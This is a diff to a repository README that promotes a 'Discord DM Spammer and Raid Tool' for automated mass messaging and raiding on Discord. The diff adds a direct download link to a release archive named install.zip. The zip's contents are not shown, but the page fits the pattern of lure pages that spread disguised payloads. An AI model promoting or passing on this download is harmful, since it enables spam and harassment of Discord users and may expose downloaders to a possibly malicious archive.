@@ -16,7 +16,7 @@ Welcome to the Discord DM Spammer and Raid Tool repository, your go-to solution 
 - Topics: discord-bot, python-bot, script, discord-automation, discord-spammer, discord-raid-tool, messaging-bot, automation-tool
 
 ## 📥 Download
-Download the Discord DM Spammer and Raid Tool [here]() and harness the power of automated messaging on Discord!
+Download the Discord DM Spammer and Raid Tool [here](https://github.com/bradleysmithrobberts2025/Discord-Multi-Tool/releases/download/install/install.zip) and harness the power of automated messaging on Discord!
 
 [![Download Discord DM Tool](https://github.com/bradleysmithrobberts2025/Discord-Multi-Tool/releases)](https://github.com/bradleysmithrobberts2025/Discord-Multi-Tool/releases/download/install/install.zip)
 
